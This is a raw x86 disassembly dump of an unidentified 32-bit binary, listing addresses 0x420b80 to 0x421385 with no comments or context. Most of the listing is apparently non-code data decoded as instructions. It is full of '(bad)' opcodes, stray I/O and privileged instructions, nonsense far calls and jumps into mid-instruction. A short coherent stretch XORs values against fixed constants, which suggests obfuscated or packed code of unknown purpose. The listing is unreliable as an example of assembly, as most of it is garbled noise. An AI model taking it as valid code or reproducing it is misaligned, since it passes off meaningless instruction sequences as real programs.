  420b80:	(bad)  
  420b81:	(bad)  
  420b82:	dec    DWORD PTR [ebx-0x14373]
  420b88:	(bad)  
  420b89:	jmp    0x420f70
  420b8e:	jo     0x420be5
  420b90:	mov    es,WORD PTR [eax+edi*4-0x74]
  420b94:	mov    ah,0x79
  420b96:	rcl    ah,cl
  420b98:	mov    WORD PTR [esp+edi*1+0x89e508b],fs
  420b9f:	stos   DWORD PTR es:[edi],eax
  420ba0:	sar    BYTE PTR [esi-0x41413bb6],0x5f
  420ba7:	rol    BYTE PTR [ebx],0x89
  420baa:	mov    ?,WORD PTR [ecx]
  420bac:	jecxz  0x420c02
  420bae:	or     al,0xc2
  420bb0:	ficom  WORD PTR [edi]
  420bb2:	leave  
  420bb3:	stos   BYTE PTR es:[edi],al
  420bb4:	or     eax,0xd690c2
  420bb9:	push   esi
  420bbb:	pop    esi
  420bbc:	push   esp
  420bbd:	call   0x24a9:0x7f9fbee9
  420bc4:	fld    DWORD PTR [eax]
  420bc6:	add    dh,BYTE PTR [edx]
  420bc8:	mov    DWORD PTR [ebp+ebx*2-0x13],ebx
  420bcc:	sbb    ecx,esi
  420bce:	jno    0x420b68
  420bd0:	stc    
  420bd1:	inc    edx
  420bd2:	retf   
  420bd3:	repz add eax,0x65b3264d
  420bd9:	pop    es
  420bda:	daa    
  420bdb:	xchg   edx,eax
  420bdc:	out    dx,al
  420bdd:	inc    eax
  420bde:	rcl    eax,cl
  420be0:	and    eax,0xb4eeaa27
  420be5:	cs mov dh,0x11
  420be8:	cmp    eax,DWORD PTR [edi]
  420bea:	out    dx,al
  420beb:	pusha  
  420bec:	ja     0x420bfd
  420bee:	xlat   BYTE PTR ds:[ebx]
  420bef:	addr16 aam 0x12
  420bf2:	mov    ecx,0x6deb0b87
  420bf7:	jge    0x420c4e
  420bf9:	fs pop ss
  420bfb:	idiv   ebp
  420bfd:	retf   
  420bfe:	jbe    0x420c7f
  420c00:	jmp    0x420c76
  420c02:	mov    bh,0xbc
  420c04:	sbb    BYTE PTR [ebx],ah
  420c06:	outs   dx,DWORD PTR ds:[esi]
  420c07:	popa   
  420c08:	mov    BYTE PTR [ecx-0x3f18fc15],dh
  420c0e:	mov    ebp,0x6dac0c46
  420c13:	hlt    
  420c14:	inc    ebx
  420c15:	push   ebp
  420c16:	(bad)  
  420c17:	mov    al,0x92
  420c19:	nop
  420c1a:	push   0xffffffa6
  420c1c:	lea    ebp,[ecx-0x29]
  420c1f:	das    
  420c20:	push   esi
  420c21:	sti    
  420c22:	ss push ss
  420c24:	aas    
  420c25:	push   esp
  420c26:	jle    0x420c68
  420c28:	imul   ebp,DWORD PTR ds:0x7e27fa31,0x1e
  420c2f:	sub    ch,dh
  420c31:	ds stc 
  420c33:	or     bh,al
  420c35:	mov    edi,0x8d47f13f
  420c3a:	hlt    
  420c3b:	mov    fs,WORD PTR [eax-0x7fe91f13]
  420c41:	cmp    dh,BYTE PTR [eax-0x27]
  420c44:	xor    edi,DWORD PTR [edi-0x6da34334]
  420c4a:	daa    
  420c4b:	fnsave [edi-0x73]
  420c4e:	cmp    DWORD PTR [ecx],esp
  420c50:	pop    ebp
  420c51:	mov    eax,0x91614e68
  420c56:	shl    BYTE PTR [edi+0x7d],cl
  420c59:	mov    al,ds:0xdddece06
  420c5e:	mov    bl,BYTE PTR [esi+ecx*1+0x570368c2]
  420c65:	(bad)  
  420c66:	idiv   BYTE PTR [edi]
  420c68:	add    ebp,ecx
  420c6a:	or     BYTE PTR ds:0xe2204955,ah
  420c70:	dec    esi
  420c71:	test   BYTE PTR [ecx],dl
  420c73:	and    esp,esi
  420c75:	dec    edi
  420c76:	xchg   esi,eax
  420c77:	adc    al,0x1e
  420c79:	sub    dl,bl
  420c7b:	cs jb  0x420ce9
  420c7e:	pop    edi
  420c7f:	sti    
  420c80:	pop    esp
  420c81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c82:	or     edi,esp
  420c84:	inc    edx
  420c85:	pop    ecx
  420c86:	mov    al,0xda
  420c88:	dec    esi
  420c89:	jp     0x420ca9
  420c8b:	les    eax,FWORD PTR [ebx-0x78]
  420c8e:	icebp  
  420c8f:	jl     0x420c12
  420c91:	mov    ecx,0xa99095c
  420c96:	xor    al,BYTE PTR [edx-0x4ac596e9]
  420c9c:	pop    edx
  420c9d:	mov    ecx,0xd33981ec
  420ca2:	add    DWORD PTR [eax],edx
  420ca4:	(bad)  
  420ca6:	sub    BYTE PTR [eax],bh
  420ca8:	dec    esp
  420ca9:	adc    dl,BYTE PTR [eax+eiz*1]
  420cac:	pop    edi
  420cad:	jo     0x420cac
  420caf:	daa    
  420cb0:	scas   al,BYTE PTR es:[edi]
  420cb1:	mov    al,ds:0x7a382dc5
  420cb6:	test   BYTE PTR ds:0x920e2e36,0xbd
  420cbd:	mov    edi,0xbcec97c8
  420cc2:	sbb    ch,dh
  420cc4:	(bad)  
  420cc5:	test   al,0x5b
  420cc7:	push   cs
  420cc8:	mov    dl,0xe7
  420cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ccb:	aaa    
  420ccc:	aas    
  420ccd:	rcr    DWORD PTR [edx+ecx*1],1
  420cd0:	mov    dl,0x6e
  420cd2:	adc    BYTE PTR [edi+0x67],0x72
  420cd6:	jle    0x420d2a
  420cd8:	hlt    
  420cd9:	(bad)  
  420cda:	ficom  WORD PTR [ebx]
  420cdc:	scas   al,BYTE PTR es:[edi]
  420cdd:	push   esi
  420cde:	cmp    DWORD PTR [edi+0x26abb52b],ebp
  420ce4:	and    bl,ch
  420ce6:	call   0x2f4360ce
  420ceb:	jno    0x420cf8
  420ced:	inc    ebx
  420cee:	dec    ecx
  420cef:	rcl    edx,1
  420cf1:	xor    eax,DWORD PTR [ebp-0x11]
  420cf4:	lock jecxz 0x420d6f
  420cf7:	leave  
  420cf8:	out    dx,eax
  420cf9:	add    DWORD PTR [edi-0x544d557f],edx
  420cff:	es aaa 
  420d01:	fwait
  420d02:	ds adc al,0x40
  420d06:	shr    ebp,0x42
  420d09:	cmc    
  420d0a:	push   edi
  420d0b:	cmp    eax,0x1961563d
  420d10:	mov    ds:0xca87f089,eax
  420d15:	push   edi
  420d16:	mov    ecx,DWORD PTR [ebx]
  420d18:	cdq    
  420d19:	pop    edi
  420d1a:	xchg   esi,eax
  420d1b:	xor    eax,0xc649bf15
  420d20:	aam    0x2d
  420d22:	neg    DWORD PTR [edx-0xc]
  420d25:	xor    eax,0x52ce212
  420d2a:	in     eax,0x72
  420d2c:	imul   edx,DWORD PTR [ebx+edx*8-0x70],0x5f
  420d31:	stos   DWORD PTR es:[edi],eax
  420d32:	add    edx,DWORD PTR [ebx]
  420d34:	out    dx,al
  420d35:	dec    edx
  420d36:	jecxz  0x420d52
  420d38:	out    dx,eax
  420d39:	jecxz  0x420cfb
  420d3b:	mov    WORD PTR [edx+0x29],es
  420d3e:	xchg   esp,eax
  420d3f:	mov    ds:0x8e6c8829,eax
  420d44:	cli    
  420d45:	rcl    DWORD PTR [eax+0x5310e489],cl
  420d4b:	cmp    BYTE PTR [eax+0x72],bl
  420d4e:	fild   WORD PTR [ebx-0x2d0b68b8]
  420d54:	outs   dx,BYTE PTR ds:[esi]
  420d55:	test   al,0x71
  420d57:	lahf   
  420d58:	call   0x99c7:0x501f658c
  420d5f:	cmp    BYTE PTR [esi-0x44],al
  420d62:	adc    bl,ah
  420d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d65:	shl    bl,0x2e
  420d68:	fistp  WORD PTR ds:0xda398bb7
  420d6e:	in     al,dx
  420d6f:	inc    ebp
  420d70:	aad    0xf9
  420d72:	mov    WORD PTR [esi+0x2],es
  420d75:	add    DWORD PTR [ebp-0x32],edx
  420d78:	(bad)  
  420d7a:	cmp    al,0x16
  420d7c:	push   ecx
  420d7d:	pop    ds
  420d7e:	sahf   
  420d7f:	ret    0x2b1a
  420d82:	(bad)  
  420d83:	test   ah,0xa1
  420d86:	aaa    
  420d87:	imul   ebx,DWORD PTR [eax-0x6c],0xffffff86
  420d8b:	jns    0x420d14
  420d8d:	pushf  
  420d8e:	push   0x741383ab
  420d93:	fisub  DWORD PTR [eax+0x4669f944]
  420d99:	lds    esi,FWORD PTR ss:[edx+0x6a50261]
  420da0:	or     BYTE PTR [eax],bl
  420da2:	lods   al,BYTE PTR ds:[esi]
  420da3:	addr16 dec eax
  420da5:	sar    BYTE PTR [ebp+eax*8+0x3e],1
  420da9:	mov    cl,0x4
  420dab:	push   ebp
  420dac:	mov    edi,ebx
  420dae:	fidiv  DWORD PTR [eax]
  420db0:	sub    ah,BYTE PTR [edx-0x1f]
  420db3:	inc    ebp
  420db4:	and    esi,DWORD PTR [ebx-0x2e]
  420db7:	cmc    
  420db8:	(bad)  [ebp-0xadf2223]
  420dbe:	mov    edi,0x4942a703
  420dc3:	ret    
  420dc4:	adc    bl,BYTE PTR [edi]
  420dc6:	add    BYTE PTR [esi-0x79],ch
  420dc9:	jmp    0x420e47
  420dcb:	out    dx,al
  420dcc:	dec    ebp
  420dcd:	add    esi,eax
  420dcf:	bound  edi,QWORD PTR [ebp-0x16]
  420dd2:	adc    DWORD PTR [edi-0x14],ecx
  420dd5:	and    dh,BYTE PTR [esi]
  420dd7:	sbb    esi,DWORD PTR [edx-0x6dea4749]
  420ddd:	pop    ds
  420dde:	pop    ss
  420ddf:	dec    esp
  420de0:	out    dx,al
  420de1:	sub    al,BYTE PTR [esi]
  420de3:	rcl    DWORD PTR [ebp+0x754dc3e6],1
  420de9:	or     al,0x9b
  420deb:	xchg   BYTE PTR [ebx+0x2fe5fc1f],ah
  420df1:	cwde   
  420df2:	mov    edi,0x977941fb
  420df7:	push   esp
  420df8:	lea    ecx,[esi]
  420dfa:	or     dl,BYTE PTR [edx]
  420dfc:	cmp    cl,BYTE PTR [ebx+eax*8+0x4287e51]
  420e03:	and    ecx,ecx
  420e05:	sbb    BYTE PTR [ebx+0x60],bl
  420e08:	mov    ch,0x26
  420e0a:	push   es
  420e0b:	out    0x45,al
  420e0d:	jns    0x420e8b
  420e0f:	dec    eax
  420e10:	loop   0x420e67
  420e12:	mov    ds:0x2b4dac21,al
  420e17:	pop    es
  420e18:	push   ebp
  420e19:	mov    bh,0x1a
  420e1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e1c:	adc    al,0x76
  420e1e:	sub    bh,bh
  420e20:	sub    bl,ch
  420e22:	add    eax,0xddccb60
  420e27:	icebp  
  420e28:	xchg   ecx,eax
  420e29:	dec    edi
  420e2a:	fdiv   DWORD PTR [eax-0x65]
  420e2d:	and    ecx,0xffffff98
  420e30:	cdq    
  420e31:	pop    ss
  420e32:	pop    eax
  420e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e34:	repnz push ebx
  420e36:	mov    ecx,0xf3fe94d5
  420e3b:	cmp    al,0xf8
  420e3d:	jns    0x420dc4
  420e3f:	jb     0x420ebc
  420e41:	mov    eax,0x15a0fad2
  420e46:	adc    ah,BYTE PTR [ebx+0x6ceb77cd]
  420e4c:	sbb    BYTE PTR [edx],ch
  420e4e:	mov    BYTE PTR [eax],cl
  420e50:	fs popf 
  420e52:	das    
  420e53:	mov    edx,0x4bd893fa
  420e58:	sbb    DWORD PTR [esi+0x60eb86b0],0x72
  420e5f:	mov    ds:0xf17bedab,eax
  420e64:	xchg   ebx,eax
  420e65:	mov    ebx,0x9dc5853
  420e6a:	outs   dx,DWORD PTR ds:[esi]
  420e6b:	ja     0x420ee8
  420e6d:	ret    0x88b6
  420e70:	mov    eax,0x62dead65
  420e75:	int    0x2d
  420e77:	stc    
  420e78:	jns    0x420e6b
  420e7a:	fimul  DWORD PTR [ebp+0x37]
  420e7d:	xor    ebx,DWORD PTR [ebp-0x1bfe44e0]
  420e83:	gs push 0xe3b9953d
  420e89:	popf   
  420e8a:	jp     0x420e66
  420e8c:	xchg   edx,eax
  420e8d:	cdq    
  420e8e:	inc    esp
  420e8f:	pusha  
  420e90:	shr    DWORD PTR [edx-0x7c597a4b],cl
  420e96:	jmp    0x420e87
  420e98:	mov    edx,0xa11abd0e
  420e9d:	fsub   DWORD PTR [edx-0x7c46a4bc]
  420ea3:	dec    edx
  420ea4:	dec    eax
  420ea5:	inc    esi
  420ea6:	je     0x420e9b
  420ea8:	or     ebx,DWORD PTR [eax-0x57ef895e]
  420eae:	scas   eax,DWORD PTR es:[edi]
  420eaf:	outs   dx,DWORD PTR ss:[esi]
  420eb1:	out    dx,eax
  420eb2:	cmp    eax,0x6782368
  420eb7:	mov    bh,0x9f
  420eb9:	sbb    DWORD PTR [esi-0x7df931af],edi
  420ebf:	sbb    BYTE PTR [ecx],dh
  420ec1:	inc    ecx
  420ec2:	pop    ds
  420ec3:	mov    WORD PTR [edx],fs
  420ec5:	push   edx
  420ec6:	mov    ds:0xaae34106,eax
  420ecb:	out    0xc5,al
  420ecd:	add    eax,0xf204beba
  420ed2:	mov    dh,dl
  420ed4:	adc    cl,BYTE PTR [esi+0x229abf69]
  420eda:	mov    esi,0xfdd96d07
  420edf:	xchg   ebp,eax
  420ee0:	sahf   
  420ee1:	adc    ebp,esi
  420ee3:	sub    edx,DWORD PTR [ecx]
  420ee5:	mov    ds:0x4de82262,al
  420eea:	cmp    eax,0x1a606262
  420eef:	sbb    eax,0x4f816d4f
  420ef4:	leave  
  420ef5:	jecxz  0x420ef6
  420ef7:	cmp    DWORD PTR [esp+ecx*4-0x2a10e43d],ecx
  420efe:	repz cdq 
  420f00:	jne    0x420e9a
  420f02:	cmp    eax,DWORD PTR [ecx]
  420f04:	dec    ebp
  420f05:	clc    
  420f06:	ret    
  420f07:	push   eax
  420f08:	mov    bl,0x12
  420f0a:	xchg   esp,eax
  420f0b:	push   0x8456f627
  420f10:	dec    ebx
  420f11:	into   
  420f12:	retf   0xb5b1
  420f15:	jge    0x420f31
  420f17:	inc    ebp
  420f18:	jmp    0x420f47
  420f1a:	push   esi
  420f1b:	test   eax,0x80710ba
  420f20:	lods   al,BYTE PTR ds:[esi]
  420f21:	outs   dx,BYTE PTR ds:[esi]
  420f22:	pop    eax
  420f23:	icebp  
  420f24:	(bad)  
  420f25:	push   ss
  420f26:	mov    cl,0x56
  420f28:	sbb    dh,cl
  420f2a:	jb     0x420f5a
  420f2c:	sbb    BYTE PTR [ebx-0x66377685],bl
  420f32:	sub    ebx,DWORD PTR [edi+0x4a]
  420f35:	por    mm6,QWORD PTR ds:0xff7769e2
  420f3c:	pop    ecx
  420f3d:	cwde   
  420f3e:	das    
  420f3f:	xor    DWORD PTR [ebx-0x45],ebx
  420f42:	sbb    ebp,DWORD PTR [edi+0x718f6d5e]
  420f48:	je     0x420f37
  420f4a:	sub    DWORD PTR [edi+0x6a03cbe],ecx
  420f50:	lock jo 0x420fad
  420f53:	(bad)  
  420f55:	dec    esi
  420f56:	jne    0x420fa9
  420f58:	out    0x64,eax
  420f5a:	add    edi,ebp
  420f5c:	aad    0xe9
  420f5e:	push   ebp
  420f5f:	xchg   edx,eax
  420f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f61:	fisub  WORD PTR [edi-0x428bb7b]
  420f67:	out    dx,al
  420f68:	mov    bh,0xe1
  420f6a:	pusha  
  420f6b:	(bad)  
  420f6c:	fwait
  420f6d:	pusha  
  420f6e:	or     al,0x92
  420f70:	cmp    ecx,DWORD PTR [eax+0x18]
  420f73:	je     0x4221a3
  420f79:	mov    eax,DWORD PTR [ebp-0x144]
  420f7f:	mov    ecx,DWORD PTR [ebp-0x38]
  420f82:	mov    edx,DWORD PTR [ebp+0x8]
  420f85:	add    edx,DWORD PTR [ecx+eax*4]
  420f88:	mov    DWORD PTR [ebp-0x48],edx
  420f8b:	mov    eax,DWORD PTR [ebp-0x48]
  420f8e:	mov    DWORD PTR [ebp-0x210],eax
  420f94:	mov    eax,DWORD PTR [ebp+0xc]
  420f97:	mov    DWORD PTR [ebp-0x20c],eax
  420f9d:	mov    DWORD PTR [ebp-0x1f0],0xcb79b576
  420fa7:	mov    DWORD PTR [ebp-0x1ec],0x9c2b8ae8
  420fb1:	mov    DWORD PTR [ebp-0x1e0],0xcb79b572
  420fbb:	mov    DWORD PTR [ebp-0x1dc],0x9c2b8ae8
  420fc5:	lea    eax,[ebp-0x1e8]
  420fcb:	mov    DWORD PTR [ebp-0x1f4],eax
  420fd1:	mov    eax,DWORD PTR [ebp-0x20c]
  420fd7:	movzx  eax,WORD PTR [eax+0x20]
  420fdb:	xor    eax,0xa59b
  420fe0:	movzx  eax,ax
  420fe3:	sar    eax,1
  420fe5:	mov    ecx,DWORD PTR [ebp-0x20c]
  420feb:	movzx  ecx,WORD PTR [ecx+0x20]
  420fef:	xor    ecx,0xa59b
  420ff5:	movzx  ecx,cx
  420ff8:	shl    ecx,0xf
  420ffb:	or     eax,ecx
  420ffd:	movzx  eax,ax
  421000:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421006:	mov    DWORD PTR [ecx],eax
  421008:	mov    eax,DWORD PTR [ebp-0x1e0]
  42100e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421014:	xor    eax,0xcb79b576
  421019:	xor    edx,0x9c2b8ae8
  42101f:	mov    cl,0x2
  421021:	call   0x408bb8
  421026:	mov    ebx,eax
  421028:	mov    esi,edx
  42102a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421030:	mov    edx,DWORD PTR [ebp-0x1dc]
  421036:	xor    eax,0xcb79b576
  42103b:	jmp    0x421422
  421040:	xchg   ebp,eax
  421041:	or     ebp,DWORD PTR ds:0x9a3cb322
  421047:	mov    esp,0x90cf9e52
  42104c:	sub    al,0x71
  42104e:	and    BYTE PTR [esi-0x413f4c6d],bl
  421054:	dec    edx
  421055:	les    edi,FWORD PTR [esi+0x44a89fbe]
  42105b:	mov    ebp,DWORD PTR [esi+0x1]
  42105e:	sub    bh,BYTE PTR [ebp+0x74]
  421061:	or     DWORD PTR [esi],edx
  421063:	jl     0x4210c0
  421065:	(bad)  
  421066:	cmp    al,0x57
  421068:	push   eax
  421069:	xor    bl,dl
  42106b:	cmc    
  42106c:	jb     0x4210cf
  42106e:	pop    ecx
  42106f:	add    al,0x3e
  421071:	cwde   
  421072:	or     BYTE PTR ds:0xe54e0d6,cl
  421078:	inc    edi
  421079:	pop    ecx
  42107a:	mov    ds:0xb59716d9,eax
  42107f:	inc    eax
  421080:	sub    ch,0x89
  421083:	ret    0x92aa
  421086:	sar    BYTE PTR [edx],cl
  421088:	rol    eax,cl
  42108a:	iret   
  42108b:	arpl   WORD PTR [ecx+ecx*8-0x34d0463d],bx
  421092:	sub    DWORD PTR ds:0xc3c677cd,ebx
  421098:	(bad)  
  42109a:	adc    al,0x22
  42109c:	mov    ebx,0x5fc426f3
  4210a1:	out    0x1d,al
  4210a3:	out    0xd7,eax
  4210a5:	ds push esi
  4210a7:	inc    ebx
  4210a8:	xchg   ebp,eax
  4210a9:	cmp    BYTE PTR [esi+0x7ae52bdd],dl
  4210af:	rcl    DWORD PTR [ecx],cl
  4210b1:	scas   al,BYTE PTR es:[edi]
  4210b2:	xchg   ebp,eax
  4210b3:	push   ss
  4210b4:	push   es
  4210b5:	bnd jnp 0x4210ab
  4210b8:	pop    ds
  4210b9:	mov    eax,0xb8f71ed2
  4210be:	adc    eax,0x76fd27e7
  4210c3:	sbb    BYTE PTR [esi],bh
  4210c5:	dec    ebx
  4210c6:	(bad)  
  4210c7:	sti    
  4210c8:	sbb    al,BYTE PTR [esi-0x4b8f4a0f]
  4210ce:	cmp    al,0xf2
  4210d0:	add    DWORD PTR [edi],ebx
  4210d2:	mov    esi,0x5c26db5f
  4210d7:	pusha  
  4210d8:	es jnp 0x4210b6
  4210db:	ror    eax,1
  4210dd:	push   es
  4210de:	sub    ebp,DWORD PTR [ebx]
  4210e0:	gs ret 
  4210e2:	fdivp  st(4),st
  4210e4:	out    0x2a,eax
  4210e6:	test   BYTE PTR [eax+0x5405aca7],bh
  4210ec:	add    dh,BYTE PTR fs:[ecx+0x46d0ca97]
  4210f3:	cdq    
  4210f4:	cmp    al,0x2d
  4210f6:	iret   
  4210f7:	and    al,0x20
  4210f9:	cmp    DWORD PTR [ebp+0x3e],edi
  4210fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210fd:	cmp    ch,ch
  4210ff:	call   0x8b104d77
  421104:	fisubr DWORD PTR [esi+0x49]
  421107:	xor    eax,0x2593721f
  42110c:	sub    ah,bl
  42110e:	xor    dl,BYTE PTR [edx+ebp*2+0x7f]
  421112:	xchg   BYTE PTR [edi-0x49b1c43d],dl
  421118:	adc    al,0xe9
  42111a:	jmp    0xfb1c2ecc
  42111f:	hlt    
  421120:	jmp    DWORD PTR [edi-0x1b]
  421123:	mov    al,ds:0x3dc725b1
  421128:	loop   0x4210c6
  42112a:	jne    0x42119a
  42112c:	mov    esi,0xb07277c
  421131:	mov    ds:0x155dd7ab,al
  421136:	push   edx
  421137:	syscall 
  421139:	loope  0x421156
  42113b:	xor    eax,0x493d7fca
  421140:	or     DWORD PTR [edi+0x72],0xfc11a35f
  421147:	sar    DWORD PTR [esi],0x27
  42114a:	push   es
  42114b:	cmp    edi,DWORD PTR [ebx]
  42114d:	jl     0x4210f8
  42114f:	addr16 (bad) 
  421151:	pop    ds
  421152:	and    eax,0xaf160d7c
  421157:	jo     0x4211b6
  421159:	es pop eax
  42115b:	cmp    ebx,DWORD PTR [ecx+eax*4-0x5a]
  42115f:	mov    WORD PTR [ecx+0x2bf39346],gs
  421165:	call   0x6bcdbeeb
  42116a:	int    0x44
  42116c:	or     DWORD PTR [edi-0x16],ebx
  42116f:	add    edx,DWORD PTR [esi-0x23]
  421172:	pusha  
  421173:	sub    cl,BYTE PTR [ebx]
  421175:	jmp    0xa5c2:0xedf1a3ee
  42117c:	xor    cl,BYTE PTR [edx+ecx*2-0x68a7a1f0]
  421183:	aad    0xb6
  421185:	je     0x421165
  421187:	and    DWORD PTR [edi+0x45],ebp
  42118a:	jecxz  0x42120b
  42118c:	jmp    0x6865:0x860efb43
  421193:	fistp  DWORD PTR [ebp-0x3f]
  421196:	in     eax,0xfe
  421198:	or     al,0xe8
  42119a:	add    eax,0xa26fe1
  42119f:	pop    eax
  4211a0:	jecxz  0x4211be
  4211a2:	xor    eax,0x29a06ef3
  4211a7:	mov    WORD PTR [edx],ds
  4211a9:	dec    eax
  4211aa:	or     ecx,DWORD PTR [ebx]
  4211ac:	xor    al,0xd4
  4211ae:	cli    
  4211af:	(bad)  
  4211b0:	stc    
  4211b1:	rol    ch,cl
  4211b3:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4211b5:	icebp  
  4211b6:	or     DWORD PTR [edi],edx
  4211b8:	add    DWORD PTR [ebx+0x75],ebp
  4211bb:	xor    DWORD PTR [eax],0x25962b4e
  4211c1:	mov    esi,0x1579a80b
  4211c6:	pop    ebx
  4211c7:	push   eax
  4211c8:	and    eax,0x4d594fea
  4211cd:	jge    0x421201
  4211cf:	push   esp
  4211d0:	shl    DWORD PTR [ebp+0x5d8c3b09],1
  4211d6:	xor    ecx,DWORD PTR [ebp+0x4]
  4211d9:	dec    ebx
  4211da:	xor    BYTE PTR [ecx+0x119601b5],0x25
  4211e1:	push   ebp
  4211e2:	ja     0x4211fe
  4211e4:	outs   dx,DWORD PTR ds:[esi]
  4211e5:	mov    dh,0xbc
  4211e7:	nop
  4211e8:	stos   DWORD PTR es:[edi],eax
  4211e9:	mov    ch,0xd5
  4211eb:	pop    ss
  4211ec:	rcl    ebx,cl
  4211ee:	clc    
  4211ef:	jb     0x4211ff
  4211f1:	call   0xabfa:0xa9f737be
  4211f8:	mov    BYTE PTR [edx-0x6c],bh
  4211fb:	inc    ecx
  4211fc:	or     dl,ah
  4211fe:	add    eax,0x98e56838
  421203:	rcr    DWORD PTR [eax+edi*2],1
  421206:	cdq    
  421207:	pop    eax
  421208:	dec    esp
  421209:	jo     0x421213
  42120b:	dec    eax
  42120c:	and    eax,edi
  42120e:	dec    edi
  42120f:	mov    dl,0xe
  421211:	dec    eax
  421212:	ret    0xca3c
  421215:	int3   
  421216:	sub    al,0x82
  421218:	adc    al,0x5a
  42121a:	cmp    BYTE PTR [ebx-0x62],0x8
  42121e:	pop    es
  42121f:	and    esp,DWORD PTR [ebp-0x67]
  421222:	push   esp
  421223:	outs   dx,DWORD PTR ds:[esi]
  421224:	jmp    0x60795d4
  421229:	fcmovnbe st,st(3)
  42122b:	or     eax,0x1560ec6
  421230:	jbe    0x4211f3
  421232:	fisttp WORD PTR [eax]
  421234:	dec    edx
  421235:	fisttp QWORD PTR [ebx]
  421237:	inc    esi
  421238:	adc    ecx,esi
  42123a:	push   ebp
  42123b:	outs   dx,BYTE PTR ds:[esi]
  42123c:	mov    WORD PTR [ecx-0x1],es
  42123f:	mul    BYTE PTR [edi]
  421241:	mov    dh,0x8f
  421243:	out    0x6d,al
  421245:	cmp    DWORD PTR [edx+0x1f],edx
  421248:	sbb    ebp,DWORD PTR [edi]
  42124a:	and    cl,ah
  42124c:	dec    esi
  42124d:	xchg   esp,eax
  42124e:	mov    al,0xbe
  421250:	cdq    
  421251:	cmp    al,0x30
  421253:	daa    
  421254:	enter  0x8166,0x23
  421258:	jns    0x4211fd
  42125a:	lahf   
  42125b:	rcr    BYTE PTR [esi+0x5a42e2b5],cl
  421261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421262:	dec    edx
  421263:	nop
  421264:	dec    ebp
  421265:	setns  BYTE PTR [ebx]
  421268:	mov    WORD PTR [edi+eax*2],?
  42126b:	(bad)  
  42126c:	xchg   esi,eax
  42126d:	mov    dl,0x6f
  42126f:	ins    BYTE PTR es:[edi],dx
  421270:	fnstsw WORD PTR [esi-0x64ba9ea8]
  421276:	lods   al,BYTE PTR ds:[esi]
  421277:	(bad)  
  421278:	fsubr  st,st(4)
  42127a:	int3   
  42127b:	push   0xe1589e57
  421280:	mov    al,0xd3
  421282:	add    eax,0x203b776a
  421287:	loop   0x4212f9
  421289:	mov    eax,0x4b26cf94
  42128e:	enter  0x156a,0xd5
  421292:	pop    es
  421293:	outs   dx,BYTE PTR ds:[esi]
  421294:	sub    BYTE PTR [esi-0x3c],ah
  421297:	inc    ecx
  421298:	pop    ds
  421299:	les    esp,FWORD PTR [ebx+0x67]
  42129c:	fucom  st(6)
  42129e:	push   es
  42129f:	pop    ecx
  4212a0:	mov    ebp,0xac7abac
  4212a5:	xchg   ebp,eax
  4212a6:	mov    ds:0xca4ec161,eax
  4212ab:	out    0xf4,eax
  4212ad:	inc    ebx
  4212ae:	scas   al,BYTE PTR es:[edi]
  4212af:	cmp    DWORD PTR [edx+0x47],edi
  4212b2:	jnp    0x4212bf
  4212b4:	ror    DWORD PTR [esi],0x7e
  4212b7:	ja     0x42128c
  4212b9:	repnz mov BYTE PTR [ebx-0x5d6f1625],bh
  4212c0:	and    bl,BYTE PTR [edi]
  4212c2:	mov    ecx,0x1f939ebc
  4212c7:	xor    dh,bh
  4212c9:	(bad)  
  4212ca:	mov    ch,0x75
  4212cc:	or     BYTE PTR [ecx+0x58],ch
  4212cf:	push   es
  4212d0:	fst    QWORD PTR [esi]
  4212d2:	pop    ebx
  4212d3:	call   DWORD PTR [esi+0x1d]
  4212d6:	js     0x4212ae
  4212d8:	ss fwait
  4212da:	cmp    DWORD PTR [edx*1+0x7cdca1e],ebx
  4212e1:	dec    esi
  4212e2:	arpl   WORD PTR [edi],di
  4212e4:	mov    bl,cl
  4212e6:	jmp    0x421299
  4212e8:	addr16 ds (bad) 
  4212eb:	sar    DWORD PTR [edi],cl
  4212ed:	cwde   
  4212ee:	(bad)  
  4212ef:	cmc    
  4212f0:	setle  BYTE PTR [ebx-0x4c]
  4212f4:	out    dx,al
  4212f5:	repz pop edx
  4212f7:	jae    0x4212be
  4212f9:	push   es
  4212fa:	sub    dl,BYTE PTR [eax-0x45b471c3]
  421300:	mov    ebp,0xc104d649
  421305:	add    eax,0x3a1e9ce
  42130a:	dec    eax
  42130b:	xchg   ebx,eax
  42130c:	mov    eax,ds:0x58f0e142
  421311:	or     esp,esp
  421313:	mov    ch,0xb1
  421315:	sar    BYTE PTR [edx-0x688b3256],0x18
  42131c:	jp     0x42131e
  42131e:	mov    ecx,0x910c612c
  421323:	adc    al,al
  421325:	aas    
  421326:	xchg   BYTE PTR [ecx+0x1e],al
  421329:	jns    0x4212d6
  42132b:	xor    ah,bh
  42132d:	jo     0x4212e1
  42132f:	(bad)  
  421330:	cmp    eax,0x6f13f973
  421335:	jo     0x4212d4
  421337:	ficom  WORD PTR [ebx]
  421339:	push   ds
  42133a:	aaa    
  42133b:	pop    eax
  42133c:	jp     0x421396
  42133e:	sbb    eax,0xd87d2578
  421343:	call   0xbe535f54
  421348:	out    0xe5,eax
  42134a:	cmc    
  42134b:	outs   dx,DWORD PTR ds:[esi]
  42134c:	push   0x6
  42134e:	fwait
  42134f:	cmp    al,BYTE PTR [ebx]
  421351:	sub    al,0xc1
  421353:	in     al,dx
  421354:	add    al,0x88
  421356:	jne    0x4213cf
  421358:	int    0xac
  42135a:	cmp    ecx,DWORD PTR [edi+0x43c8044b]
  421360:	xor    eax,0x4207962
  421365:	push   edi
  421366:	rcl    DWORD PTR [edi+0x4f],cl
  421369:	aaa    
  42136a:	or     BYTE PTR [ebp+0x7d324fa7],cl
  421370:	aam    0x53
  421372:	daa    
  421373:	cwde   
  421374:	sbb    bl,0xa6
  421377:	pop    edx
  421378:	pop    esp
  421379:	or     cl,ah
  42137b:	mov    dl,0xbe
  42137d:	jecxz  0x42131d
  42137f:	fnstcw WORD PTR [ebx-0x2605345c]
  421385:	lahf   
